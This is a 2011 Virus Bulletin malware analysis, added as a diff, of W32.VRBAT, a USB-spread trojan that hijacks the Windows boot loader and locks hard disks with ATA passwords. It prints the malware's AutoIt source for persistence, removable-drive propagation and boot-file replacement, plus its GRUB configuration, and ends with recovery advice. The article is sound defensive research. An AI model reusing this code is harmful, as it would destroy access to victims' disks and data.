@@ -1,0 +1,234 @@
+Hard disk woes
+2011-10-01
+
+Jorge Lodos
+Segurmatica
+,
+Cuba
+
+Jesús. Villabrille
+Segurmatica
+,
+Cuba
+
+Edgar Guadis
+Segurmatica
+,
+Cuba
+Editor:
+Helen
+
+Martin
+Abstract
+It is uncommon these days to find malware whose sole purpose is to cause damage, but W32.VRBAT does just that (and only that) - using ATA disk security to render hard disks useless. Jorge Lodos and his colleagues have the details.
+Copyright © 2011 Virus Bulletin
+
+In the first week of August, Segurmatica support services started to receive a number of strange reports. In distant locations of the same Cuban province, dozens of hard disks suddenly failed within a few days. Malware activity was suspected, but there were no previous examples of malware causing hardware disk failure, and all isolated samples were apparently unrelated. However, a pattern soon emerged, and a file called USBCheck.exe was found to be present on many of the USB sticks that had been used on the damaged computers. A thorough analysis of this file followed, resulting in the discovery of a piece of malware that is novel not only because of its effect, but also because of the way in which it achieves it. What follows is a complete description of the malware – the components of which we have named W32.VRBAT.
+
+ATA protocol
+The ATA specification is well known [1]. All SATA and IDE disks implement this specification in order to interoperate. The ATA commands [2] are part of this specification. They allow a low level communication with disk firmware. A subset of these commands, unified under the classification security, allow the setting of security in the hard disk. The disk can be password protected and unprotected using a previously set password. Interestingly, the disk can also be prevented from receiving other security commands. In modern versions of Windows, including XP SP3 and Vista, one of the first things that the operating system does is to issue the FREEZE LOCK security command, effectively preventing any other security command from being sent to the hard drive until the next cold boot. This useful security measure prevents unauthorized applications – such as malware – from password protecting the disk. Unfortunately, this protection can be circumvented.
+
+W32.VRBAT trojan
+USBCheck.exe is a 465KB PE file. It runs from memory sticks in unpatched Windows systems using the unoriginal and now obsolete autorun.inf. It is a UPX packed self-executing AutoIt script which also contains a few other files used by the script. The actual malware code can be obtained fairly easily:
+#NoTrayIcon
+
+Opt(“TrayIconHide”, 1)
+
+$PARAM = “”
+
+If $CMDLINE[0] > 0 Then $PARAM = $CMDLINE[1]
+
+If @ScriptDir = @WindowsDir Then
+
+RegWrite(“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”, “shell”, “REG_SZ”, “explorer.exe “ & @ScriptFullPath & “ “ & $PARAM)
+
+$RR = RegRead(“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Alfa1”, “t”)
+
+If @error = 0 Then
+
+If StringLeft($RR, 8) <> @YEAR & @MON & @MDAY Then
+
+If Number(StringRight($RR, 1)) > 6 Then
+
+If $PARAM <> “-a” Then INST()
+
+Else
+
+$T = Number(StringRight($RR, 1)) + 1
+
+$T = @YEAR & @MON & @MDAY & “-” & $T
+
+RegWrite(“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Alfa1”, “t”, “REG_SZ”, $T)
+
+EndIf
+
+EndIf
+
+CICLE1()
+
+Else
+
+$T = @YEAR & @MON & @MDAY & “-1”
+
+RegWrite(“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Alfa1”, “t”, “REG_SZ”, $T)
+
+CICLE1()
+
+EndIf
+
+ElseIf @ScriptDir = @TempDir Then
+
+If IsAdmin() Then
+
+RegDelete(“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run”, “Sound_filter”)
+
+FileCopy(@ScriptFullPath, @WindowsDir & “\svchost.exe”)
+
+Run(@WindowsDir & “\svchost.exe “ & $PARAM, @WindowsDir, @SW_HIDE)
+
+Else
+
+RegWrite(“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run”, “Sound_filter”, “REG_SZ”, @ScriptFullPath & “ “ & $PARAM)
+
+CICLE1()
+
+EndIf
+
+Else
+
+If IsAdmin() Then
+
+FileCopy(@ScriptFullPath, @WindowsDir & “\svchost.exe”)
+
+Run(@WindowsDir & “\svchost.exe “ & $PARAM, @WindowsDir, @SW_HIDE)
+
+Else
+
+FileCopy(@ScriptFullPath, @TempDir & “\svchost.exe”)
+
+Run(@TempDir & “\svchost.exe “ & $PARAM, @TempDir, @SW_HIDE)
+
+EndIf
+
+EndIf
+When executed from a folder other than %windir% or %temp% the malware tries to copy itself to the %windir% folder using the name svchost.exe. If the user is not an administrator, it copies itself to the user’s temporary folder, with the same name. In both cases it executes the copied file afterwards. When executed from %temp%, if the user is not an administrator it just continues to infect removable devices using the CICLE1() function:
+Func CICLE1()
+
+While 1
+
+For $I = 67 To 90
+
+$D = Chr($I) & “:\”
+
+If Not (DriveGetType($D) = “Removable”) Then ContinueLoop
+
+If FileExists($D & “autorun.inf”) Then
+
+FileSetAttrib($D & “autorun.inf”, “-RSH”, 1)
+
+FileDelete($D & “autorun.inf”)
+
+DirRemove($D & “autorun.inf”, 1)
+
+EndIf
+
+FileInstall(“A”, $D & “autorun.inf”, 1)
+
+FileSetAttrib($D & “autorun.inf”, “+RSH”)
+
+FileCopy(@ScriptFullPath, $D & “USBCheck.exe”, 1)
+
+FileSetAttrib($D & “USBCheck.exe”, “+RSH”)
+
+Next
+
+Sleep(10000)
+
+WEnd
+
+EndFunc
+If the user is an administrator it copies itself to the %windir% folder. Thus the malware might be ‘dormant’ for a long time waiting for the user to gain administrator rights. The malware uses the registry value Sound_filter in the key HEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run to start itself when there are no administrator rights. This value is deleted once administrator rights are gained.
+If the malware is executed from %windir% it modifies the shell value of the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon key in order to execute every time a session is started. Then interesting things start happening. First, there is a time delay. The malware will not execute its payload on the same day as infection. Second, it will wait until the computer has initiated at least six sessions before executing its payload. This delay may confuse automatic processing tools, as well as users who are unable to correlate the damage caused with events that could have happened several days previously. The delay is achieved by storing a string value, t, in the registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Alfa1 with the infection date and a counter that is incremented until it reaches six. Finally there is a ‘–a’ parameter that was probably used for testing by the malware author.
+When the computer has been rebooted six times, and the date is not the same as the date of infection, the malware executes its payload, the function INST() of the script (see below). Until the payload time is reached, it continues to infect all removable devices every ten seconds, with or without administrative rights.
+Func INST()
+
+Dim $N[2]
+
+$N[0] = “”
+
+$N[1] = “”
+
+For $I = 67 To 90
+
+$D = Chr($I) & “:\”
+
+If FileExists($D & “ntldr”) Then $N[0] = “ntldr”
+
+If FileExists($D & “bootmgr”) Then $N[1] = “bootmgr”
+
+For $I = 0 To 1
+
+If $N[$I] <> “” Then
+
+FileSetAttrib($D & $N[$I], “-RSH”)
+
+FileDelete($D & $N[$I])
+
+FileInstall(“L”, $D & $N[$I], 1)
+
+FileSetAttrib($D & $N[$I], “+RSH”)
+
+FileInstall(“M”, $D & “reco.bin”, 1)
+
+FileSetAttrib($D & “reco.bin”, “+RSH”)
+
+FileInstall(“D”, $D & “reco.sys”, 1)
+
+FileSetAttrib($D & “reco.sys”, “+RSH”)
+
+$N[$I] = “”
+
+EndIf
+
+Next
+
+Next
+
+EndFunc
+
+Payload
+The main malware activity is apparently simple: it creates the files reco.bin and reco.sys in the root of every volume containing the files ntldr or bootmgr. Then it overwrites the ntldr file, effectively preventing Windows from booting.
+The new ntldr file is a functional boot loader based on Grub 0.97 [3] which, together with the reco.bin file, ensures that the image contained in reco.sys will be executed on boot. The contents of the reco.bin file are as follows:
+timeout 0
+default 0
+title v
+find --set-root --ignore-floppies /reco.sys
+map --mem /reco.sys (fd0)
+map --hook
+chainloader (fd0)+1
+rootnoverify (fd0)
+map --floppies=1
+boot
+Therefore, upon reboot, instead of Windows a different operating system will be used. The malware authors used the GRUB4DOS [4] gtldr file to create the loader, replacing all occurrences of menu.lst with reco.bin and removing references to GRUB4DOS by replacing them with spaces. Thus the released ntldr file is just a slightly modified version of the original gtldr GRUB4DOS file.
+The operating system in the reco.sys image is none other than MS-DOS 7. The image contains the files needed for MS-DOS to boot and three extra files: AUTOEXEC.BAT, V.EXE and R.COM. Booting from MS-DOS ensures that no FREEZE LOCK ATA command is sent and that the disk can receive ATA security commands.
+The autoexec.bat file executes V.EXE and then R.COM. R.COM is the MS-DOS 7 reboot utility, so the last step is rebooting. V.EXE contains the code that performs the only goal of this malware: to render the hard disk useless by protecting it with a password. It is a 17KB simple MS-DOS program compiled with Borland Turbo C. It contains a few functions to get BIOS and hard disk data, a function named SendCommands to send commands to the disk, and a SecuritySendCommands function that generates the password and then uses SendCommands to send the ATA SET PASSWORD command to the disk. The function name SecuritySendCommands, which can only send one command, suggests that this is a program developed by someone else and modified by the malware authors.
+The ScanDev function is of particular interest (Figure 1). In this function the IDENTIFY_DEVICE command is issued to get the serial number of identified ATA disks.
+Figure 1. Fragment of the ScanDev function.
+The getserial function modifies the serial number returned by IDENTIFY_DEVICE, stripping all spaces from it (Figure 2).
+Figure 2. Fragment of the getserial function.
+For each identified disk the SecuritySendCommands function is called twice, for setting both the master and user passwords. The passwords are the stored hard disk serial numbers.
+Luckily for hard disk owners, the malware authors chose to set the password as the hard disk serial number, stripping out any spaces. Therefore, passwords can be removed from the hard disk using standard tools without having to investigate (or pay for) manufacturer non-standard ATA security commands or alternative ways to find passwords. Perhaps the authors wanted to extort disk owners or perhaps they stole someone else’s code for V.EXE. Even when the damage is serious, both hardware and data can be recovered.
+
+Recovery
+Recovering before the malware delivers its payload is easy: just delete the files and update the registry keys. However, once the malware has delivered its payload it is impossible to recover the disk from a Windows application because of the FREEZE LOCK command sent by Windows itself. Pre-SP3 versions of Windows XP may be used, otherwise you need to boot to MS-DOS or similar to be able to send ATA commands to the disk.
+An external tool such as ATAPWD or MHDD (both of which can be found freely on the Internet) may be used from DOS to recover protected disks. From Linux the hdparm utility may be used with one caveat: not all kernels support ATA security commands gracefully. After recovery, the boot loader ntldr, the instructions for it (reco.bin) and the MS-DOS image (reco.sys) must be deleted; otherwise the disk can become password protected again.
+
+Conclusion
+This is the first malware (as far as we know) that uses ATA disk security to render disks useless. It is also the first to our knowledge that uses a different operating system in the same computer to achieve its purpose. It is uncommon these days to find malware whose sole purpose is to cause damage. This malware seems not to have any specific targets; it simply attacks every computer it can.
+The damage caused by this malware in its current incarnation can be reverted, but it would not be difficult for the attackers to create a stronger password that is harder to defeat.
+
+Bibliography
+[1] ATA/ATAPI 6 specification. http://www.t13.org/documents/UploadedDocuments/project/d1410r3b-ATA-ATAPI-6.pdf.
+[2] ATA/ATAPI command set (ATA8-ACS). http://www.t13.org/documents/UploadedDocuments/docs2008/D1699r6a-ATA8-ACS.pdf.
+[3] http://www.gnu.org/software/grub.
+[4] http://sourceforge.net/projects/grub4dos.
